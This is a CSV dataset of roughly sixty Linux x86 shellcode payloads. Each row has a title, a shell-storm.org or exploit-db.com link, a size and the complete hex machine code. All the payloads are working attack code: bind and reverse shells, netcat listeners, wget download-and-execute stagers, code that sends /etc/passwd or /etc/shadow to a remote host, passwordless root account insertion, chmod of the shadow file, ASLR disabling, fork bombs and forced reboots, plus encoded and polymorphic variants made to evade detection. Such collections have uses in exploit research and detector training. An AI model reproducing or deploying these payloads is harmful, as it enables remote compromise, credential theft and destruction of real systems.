title,url,size,bytes
/bin/nc -le /bin/sh -vp 17771,https://shell-storm.org/shellcode/files/shellcode-872.html,58,31c031d2506837373731682d76703189e650682f2f7368682f62696e682d6c652f89e750682f2f6e63682f62696e89e35256575389e1b00bcd80
JMP-FSTENV execve shell,https://shell-storm.org/shellcode/files/shellcode-869.html,67,d9eeeb34eb255e89f731c05089e25083c4038d760433065031c033075089e331c0508d3b5789e1b00bcd80e8d6ffffff2f2f62696e2f73689bd97424f4598d4104ffe0
Copy /etc/passwd to /tmp/outfile,https://shell-storm.org/shellcode/files/shellcode-864.html,97,31c0b00531c951687373776468632f7061682f2f65748d5c2401cd8089c3b00389e789f9666aff5acd8089c66a055831c9516866696c65682f6f7574682f746d7089e3b1426668a4015acd8089c36a045889f989f2cd8031c031dbb001b305cd80
JMP-CALL-POP execve shell,https://shell-storm.org/shellcode/files/shellcode-863.html,52,eb255e89f731c05089e25083c4038d760433065031c033075089e331c0508d3b5789e1b00bcd80e8d6ffffff2f2f62696e2f7368
; - download 192.168.2.222/x with wget; - chmod x; - execute x; - x is an executable,https://shell-storm.org/shellcode/files/shellcode-862.html,108,31c0b002cd8031db39d8742a31c0b007cd8031c931c050b00f6a7889e331c966b9ff01cd8031c0506a7889e35089e25389e1b00bcd806a0b58995268322f2f7868322e3232683136382e683139322e89e1526a74682f776765682f62696e682f75737289e352515389e1cd80
reads /etc/passwd and sends the content to 127.1.1.1 port 12345,https://shell-storm.org/shellcode/files/shellcode-861.html,111,6a665831db4331d2526a016a0289e1cd8089c66a665843687f01010166683039665389e16a10515689e143cd8089c66a0159b03fcd80eb276a05585b31c9cd8089c3b00389e789f931d2b6ffb2ffcd8089c26a0458b301cd806a015843cd80e8d4ffffff2f6574632f706173737764
Obfuscated tcp bind shell,https://shell-storm.org/shellcode/files/shellcode-852.html,112,d9ee9bd97424f45d8d6d5931dbf7ebfec3516a066a016a02ffd589c6fec35266687a69665389e16a105156ffd5b3046a0156ffd5b305525256ffd589c331c9b103fec9b03fcd8075f831dbf7e351eb135e87e687dcb00bcd805f6a665889e1cd8057c3e8e8ffffff2f62696e2f2f7368
Obfuscated execve /bin/sh,https://shell-storm.org/shellcode/files/shellcode-851.html,30,31c9f7e951040beb085e87e69987dccd80e8f3ffffff2f62696e2f2f7368
reverse tcp bind shell,https://shell-storm.org/shellcode/files/shellcode-849.html,92,31c031db31c931d2b066b301516a066a016a0289e1cd8089c6b06631dbb30268c0a8010a66687a696653fec389e16a10515689e1cd8031c9b103fec9b03fcd8075f831c052686e2f7368682f2f626989e3525389e15289e2b00bcd80
Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit(),https://shell-storm.org/shellcode/files/shellcode-848.html,83,31c0506877617264685f666f7268342f6970682f697076682f6e6574687379732f68726f632f66682f7089e331c9b101b005cd8089c331c9516a3089e131d2b201b004cd8031c083c006cd8031c04031dbcd80
tcp bind shell,https://shell-storm.org/shellcode/files/shellcode-847.html,108,31c031db31c931d2b066b301516a066a016a0289e1cd8089c6b066b3025266687a69665389e16a10515689e1cd80b066b3046a015689e1cd80b066b30552525689e1cd8089c331c9b103fec9b03fcd8075f831c052686e2f7368682f2f626989e3525389e15289e2b00bcd80
Encrypted execve /bin/sh with uzumaki algorithm,https://shell-storm.org/shellcode/files/shellcode-846.html,50,29c974145eb114468b0683e809349f3246ff8806e2f1eb05e8e7ffffff3170aa92d72dceafe1a8cc8da8e1db9da181febadb
Mutated Execve Wget Shellcode,https://shell-storm.org/shellcode/files/shellcode-845.html,96,eb01e829db740183f7e3bdf5ffffffeb01e8684165457229f67401835e5681f6254a1f3e56eb01336869732e678944240c89e16a74eb01e3682f776765eb0183682f62696eeb0133682f7573728d1c24eb018350515389e1f7dd95eb0183cd80
Mutated Fork Bomb Shellcode,https://shell-storm.org/shellcode/files/shellcode-844.html,15,31ffeb01e8b21d9783e81bcd80ebf1
Mutated Reboot Shellcode,https://shell-storm.org/shellcode/files/shellcode-843.html,55,29ff7401e883c72497eb01e1cd80eb01ff6a2959eb0101bb67452301baca9bc2ff31da7501e787da8d412f8d8940191228eb02e801cd80
Tiny Read File Shellcode,https://shell-storm.org/shellcode/files/shellcode-842.html,51,31c9f7e1b00551687373776468632f7061682f2f657489e3cd809391b00331d266baff0f42cd809231c0b004b301cd8093cd80
Tiny Execve sh Shellcode,https://shell-storm.org/shellcode/files/shellcode-841.html,21,31c9f7e1b00b51682f2f7368682f62696e89e3cd80
Tiny Shell Reverse TCP Shellcode,https://shell-storm.org/shellcode/files/shellcode-838.html,67,31dbf7e3b0664352536a0289e1cd805993b03fcd804979f9b066687f01010166682b67666a0289e16a10515389e1cd80b00b52682f2f7368682f62696e89e331c9cd80
Tiny Shell Bind TCP Random Port Shellcode,https://shell-storm.org/shellcode/files/shellcode-837.html,57,31dbf7e3b0664352536a0289e1cd80525089e1b066b304cd80b06643cd8059936a3f58cd804979f8b00b682f2f7368682f62696e89e341cd80
Tiny Shell Bind TCP Shellcode,https://shell-storm.org/shellcode/files/shellcode-836.html,73,31dbf7e3b0664352536a0289e1cd805b5e5266682b676a105150b06689e1cd80895104b066b304cd80b06643cd8059936a3f58cd804979f8b00b682f2f7368682f62696e89e341cd80
Insertion Decoder Shellcode,https://shell-storm.org/shellcode/files/shellcode-840.html,33,eb1a5e8d3e31c98b1c0e416681fbf1f1740f80fb3f74f0881f47ebebe8e1ffffff3f3f3f313fc93ff7e13fb00b3f51683f2f2f3f73683f682f3f62693f6e893fe3cd3f80f1f1
Shell Bind TCP (GetPC/Call/Ret Method),https://shell-storm.org/shellcode/files/shellcode-835.html,89,e8ffffffffc35d8d6d4a31c0996a015b52536a02ffd5965b5266682b67665389e16a105156ffd543435256ffd543525256ffd59359b03fcd804979f9b00b52682f2f7368682f62696e89e35253eb045f6a665889e1cd8057c3
Adds the string: [toor::0:0:t00r:/root:/bin/bash] to /etc/passwd thereby adding a password-less root account with login name 'toor',https://shell-storm.org/shellcode/files/shellcode-561.html,107,eb385e31c088460b88462bc6462a0a8d5e0c895e2c8d1e66b9420466baa401b005cd8089c331d28b4e2cb21fb004cd80b006cd80b00131dbcd80e8c3ffffff2f6574632f70617373776423746f6f723a3a303a303a743030723a2f726f6f743a2f62696e2f626173682023
unlink(/etc/passwd) & exit(),https://shell-storm.org/shellcode/files/shellcode-560.html,35,eb115e31c031c931d2b00a89f3cd80b001cd80e8eaffffff2f6574632f706173737764
connect back&send&exit /etc/shadow,https://shell-storm.org/shellcode/files/shellcode-207.html,155,31db6a776668646f682f736861682f65746389e36631c066406640664066406640cd8089c36631c066406640664066bac604548b0c24cd8089c631db534353435366b88206662d1c066631db664389e1cd805b89c231db5366bb82066681eb62066653b002665089e1b010505152b06666bb82066681eb7f0689e1cd8089c35b66b88206662d7e065666ba1a416681ea543ccd8031c04089c3cd80
/bin/sh Null-Free Polymorphic Shellcode,https://shell-storm.org/shellcode/files/shellcode-690.html,46,eb1231c95e565fb1158a06fec8880646e2f7ffe7e8e9ffffff32c132ca5269307469016930636a6f8ae4b10cce81
execve() shellcode with 'fuck up disasm' ability,https://shell-storm.org/shellcode/files/shellcode-237.html,32,68cd806868ebfc686a0b5831d252682f2f7368682f62696e89e3525389e1ebe1
execve read shellcode,https://shell-storm.org/shellcode/files/shellcode-204.html,92,31c0b00431db43682020202068616e643a68436f6d6d89e131d2b209cd8031c0b00331db31d2b22029d489e1cd8001c149890c2489e301d889c131d2528a033c20750480332043504b4be2f35389e131c0b00bcd8031c04031dbcd80
nc -lvve/bin/sh -p13377 shellcode,https://shell-storm.org/shellcode/files/shellcode-804.html,62,31c031d26833333737682d76703189e250686e2f736868652f6269682d6c767689e150682f2f6e63682f2f2f2f682f62696e89e35052515331d289e1b00bcd80
netcat bindshell port 8080,https://shell-storm.org/shellcode/files/shellcode-684.html,75,eb2a5e31c088460788460f88461989761a8d5e08895e1e8d5e10895e22894626b00b89f38d4e1a8d5626cd80e8d1ffffff2f62696e2f6e63232d6c7038303830232d652f62696e2f736823
netcat connect back port 8080,https://shell-storm.org/shellcode/files/shellcode-685.html,76,eb2a5e31c088460788461588461a89761b8d5e08895e1f8d5e16895e23894627b00b89f38d4e1b8d5627cd80e8d1ffffff2f62696e2f6e63233139322e3136382e312e313031233830383023
"shellcode, to open() write() close() and exit(), adds a root user no-passwd to /etc/passwd",https://shell-storm.org/shellcode/files/shellcode-548.html,83,31c031db31c953687373776468632f7061682f2f657489e366b90104b005cd8089c331c031d2686e2f7368682f2f6269683a3a2f3a683a303a3068626f623a89e1b214b004cd8031c0b006cd8031c0b001cd80
"chmod('//bin/sh' ,04775); set sh +s",https://shell-storm.org/shellcode/files/shellcode-550.html,31,31c031db31c953686e2f7368682f2f626989e366b9fd09b00fcd80b001cd80
execve()/bin/ash; exit,https://shell-storm.org/shellcode/files/shellcode-547.html,34,31c050682f617368682f62696e89e38d54240850538d0c24b00bcd8031c0b001cd80
setuid(); execve(); exit();,https://shell-storm.org/shellcode/files/shellcode-549.html,44,31c031db31c9b017cd8031c050686e2f7368682f2f626989e38d54240850538d0c24b00bcd8031c0b001cd80
"setreuid(0, 0) + execve('/bin//sh', ['/bin//sh','-c','cmd'], NULL);",https://shell-storm.org/shellcode/files/shellcode-216.html,49,6a465831db31c9cd80eb215f6a0b58995266682d6389e652682f2f7368682f62696e89e35257565389e1cd80e8daffffff636174202f6574632f736861646f773b20657869743b
"dup2(0,0); dup2(0,1); dup2(0,2);",https://shell-storm.org/shellcode/files/shellcode-259.html,15,31c9565b6a3f58cd804180f90375f5
_exit(1);,https://shell-storm.org/shellcode/files/shellcode-55.html,7,31c04089c3cd80
"if(read(fd,buf,512)<=2) _exit(1) else buf();",https://shell-storm.org/shellcode/files/shellcode-258.html,29,31dbf7e342c1e20931f304035459cd803c027e02ffe131c04089c3cd80
"read(0,buf,2541); chmod(buf,4755);",https://shell-storm.org/shellcode/files/shellcode-257.html,23,31dbf7e353b609b2ed89e1b003cd8089d189e3b00fcd80
execve(/bin/dash),https://shell-storm.org/shellcode/files/shellcode-756.html,49,eb185e31c088460989760a89460eb00b89f38d4e0a8d560ecd80e8e3ffffff2f62696e2f64617368414242424243434343
Polymorphic linux x86 nc -lvve/bin/sh -p13377 shellcode,https://www.exploit-db.com/shellcodes/51189,92,31c0b008d9d0eb432d76703133333737908d5604b00cd9d0eb312d6c7676652f62696e2f7368908d4e04b00cd9d0eb1b2f62696e2f2f2f2f2f2f6e63188d5e04505251539989e1b00bcd80d97424f4886406048d7c300531c0ffe7
Bind (User Specified Port) Shell (/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/50124,102,31c031dbb066b30131d2526a016a0289e1cd8089c6b066b302526668115c666a0289e16a10515689e1cd80b066b304525689e1cd80b066b305525689e1cd8089c631c9b03f89f3cd80fec16683f9027ef231c050b00b682f2f7368682f62696e89e331c9cd80
Reverse (dynamic IP and port/TCP) Shell (/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/50125,86,31c031dbb066b30131d2526a016a0289e1cd8089c6b066b303687f0101016668115c666a0289e16a10515689e1cd8031c931c0b03f89f3cd80fec16683f9027ef031c050b00b682f2f7368682f62696e89e331c9cd80
"execve /bin/sh Shellcode (fstenv eip GetPC technique, xor encoded)",https://www.exploit-db.com/shellcodes/49976,70,d9ee9bd97424f45f83c7258d770831c9b1040f6f070f6f0e0fefc10f7f0683c608e2efeb08aaaaaaaaaaaaaaaa9b6afac28585d9c2c285c8c3c42349fa2348f9234b1aa1672a
setreuid to 0 and then execute /bin/sh,https://www.exploit-db.com/shellcodes/49855,29,31c0b04631db31c999cd8096b00b53682f2f7368682f62696e89e3cd80
execve(/bin/sh),https://www.exploit-db.com/shellcodes/49768,17,6a0b58682f736800682f62696e89e3cd80
ASLR deactivation polymorphic shellcode,https://www.exploit-db.com/shellcodes/48592,124,31dbf7e3894424fcc74424f870616365c74424f476615f73c74424f0697a655fc74424ec6e646f6dc74424e86c2f7261c74424e465726e65c74424e079732f6bc74424dc6f632f73c74424d82f2f707283ec2889e366b9010366baa1026683c21bb005cd8089c35366b9303b665189e1c1ea1042b004cd80b001cd80
'reboot' polymorphic Shellcode,https://www.exploit-db.com/shellcodes/48243,26,31c031db31c999b058bbaddee1feb969191228ba67452301cd80
Random Bytes Encoder + XOR/SUB/NOT/ROR execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/47890,114,eb3c5e5631db31c931d2b232c00604f61680060280362c4638d17404fec1ebec5e8d7e0131c0b00131c98a1c0638d174128a5c0601881f47fec10402ebece8bfffffff4ed151b45837db55ef3defbd2a59db81db56efae3b1acbfafb43c549231258d2c5ee33822849c5c3433056cbade1028b5584
Execve() Alphanumeric Shellcode,https://www.exploit-db.com/shellcodes/47877,66,6a30583430505a486635734f663541305052585268585873685866357777506a30583430353062696e4850545852515350545455565761505953344a3441
(NOT|ROT+8 Encoded) execve(/bin/sh) null-free Shellcode,https://www.exploit-db.com/shellcodes/47564,47,eb0f5e31c0b019802e08fec8740846ebf6e8ecffffff39c8587037377b7070376a717691eb5891ea5b91e9b81388
execve(/bin/sh) socket reuse Shellcode,https://www.exploit-db.com/shellcodes/47530,42,31dbb30331c9b103fec931c0b03fcd8080f9ff75f331c96a0b589952682f2f7368682f62696e89e3cd80
execve /bin/sh ShellCode,https://www.exploit-db.com/shellcodes/47513,25,99f7e28d08be2f2f7368bf2f62696e5156578d1c24b00bcd80
Reverse Shell NULL free 127.0.0.1:4444 Shellcode,https://www.exploit-db.com/shellcodes/47514,91,31c931dbf7e3fec1fec3fec366b86701cd8093fec951b216b98203030481e903030303516668115c666a028d0c2466b86a01cd8031c9b10331c0b03ffec9cd8075f699f7e28d08be2f2f7368bf2f62696e5156578d1c24b00bcd80
adduser 'User' to /etc/passwd ShellCode,https://www.exploit-db.com/shellcodes/47511,74,31db31c966b90104f7e353687373776468632f7061682f2f65748d1c24b005cd8093f7e2686e2f7368683a2f626968303a3a2f683a3a303a68557365728d0c24b214b004cd802c13cd80
Add User to /etc/passwd Shellcode,https://www.exploit-db.com/shellcodes/47481,59,31c050687373776468632f7061682f2f657431eb8d1c2431c966b9ff01b00fcd8031c0b00531c966b90104cd8031db89c3eb1d5931c031d266ba8400b004cd8031c0b006cd805031c0b00131db5bcd80e8deffffff766c3433636b3a2436246278774a667a6f72244d556855574f304d5567646b5766505045796471675a706d2e5974504d492f67614d346c5671685032314c464e576d534a3832316b764a6e49796f4f44597442682e53463961523763695142524363773562676a58303a303a303a766c3433636b3a2f746d703a2f62696e2f62617368
execve(/bin/sh) + NOT + XOR-N + Random Encoded Shellcode,https://www.exploit-db.com/shellcodes/47461,132,eb315e8d3e31c031db8a1c0680fbaa742780fbbb7402eb0e8a5c0601881f8037dd470403ebe38a5c0601881ff617470403ebd6e8caffffffbbec73cc3f9dbb8d51bbb51bbbb322bbf279bbae8ebbb561bbb53dbbf26ebbf29fbbbf10bbb489cc762dcc1c2fbb8d91cc767ecc1d92bb8e80cc767bcc1ea7cc4f7fbbd62bcc3224cc7f37aa
Bind (43690/TCP) + Null-Free Shellcode,https://www.exploit-db.com/shellcodes/47396,53,31c031db99506a016a0289e1fec3b066cd8089c6526668aaaa666a0289e16a10515689e1fec3b066cd80525689e1b304b066cd8052525689e1fec3b066cd8089c331c9b103fec9b03fcd8075f852682f2f7368682f62696e89e3525289e1b00bcd8031c0b001b308cd80
Reverse (127.0.0.1:4444/TCP) Shell (/bin/sh) + Null-Free Shellcode,https://www.exploit-db.com/shellcodes/47352,107,31c031db504050405089e1b033043343cd8089c631c050c604247fc6442403016668115c43665389e1b033043350515689e143cd8031d287cab10389f331c0b03f49cd80b03f49cd80b03f49cd8051682f2f7368682f62696e89e35189e25189e1b00bcd8031c0b001cd80
Force Reboot Shellcode,https://www.exploit-db.com/shellcodes/47202,51,9083c8fff7d050b89d90908bf7d050b891d08d9af7d050b8d08c9d96f7d05031c089e35066682d6689e650565389e10c0bcd80
"chmod(/etc/shadow, 0666) + Polymorphic Shellcode",https://www.exploit-db.com/shellcodes/47200,53,90996a0f58526a776668646fbef033292281c63f3f3f3f5631f6bef025352481c63f3f3f3f5631f689e36668b60159cd80b001cd80
Disable ASLR Security + Polymorphic Shellcode,https://www.exploit-db.com/shellcodes/47201,107,90b8fffffffff7d050be706163655631f6be76615f735631f668697a655f686e646f6d686c2f72616865726e656879732f6b686f632f73be2f2f70725631f689e366b9bc02b006fec0fec0cd8089c35066ba010b6681c22f2f665289e19942b004cd80b006cd80b001cd80
chmod 666 /etc/passwd & chmod 666 /etc/shadow Shellcode,https://www.exploit-db.com/shellcodes/47108,61,6a0f586a6466687377682f706173682f65746389e36668b60159cd806a0f586a776668646f682f736861682f65746389e36668b60159cd806a0158cd80
execve(/bin/sh) Using JMP-CALL-POP Shellcode,https://www.exploit-db.com/shellcodes/47068,21,eb075b31c0b00bcd80e8f4ffffff2f62696e2f7368
chmod + execute(/usr/bin/wget http://192.168.1.93//x) + Hide Output Shellcode,https://www.exploit-db.com/shellcodes/47043,129,31c0b002cd8031db39d8742a31c0b007cd8031c931c050b00f6a7889e331c966b9ff01cd8031c0506a7889e35089e25389e1b00bcd806a0b589952b8323e2631b86e756c6cb86465762fb8203e2f00b82f2f7800b8312e3933b83136382eb83139322e5089e1526a74682f776765682f62696e682f75737289e352515389e1cd80
execve(/bin/sh) + Reposition + INC Encoder Shellcode,https://www.exploit-db.com/shellcodes/46994,66,eb225e8d7e0d31db31c9f7e189e2b10d8a1e4b881c02408a1f4b881c02404647e2eeffe2e8d9ffffff3251307469636fe48a54e20c81c1693069306a8a51e38ab1ce
execve(/bin/sh) Shellcode,https://www.exploit-db.com/shellcodes/46809,20,31c96a0b5851682f2f7368682f62696e89e3cd80
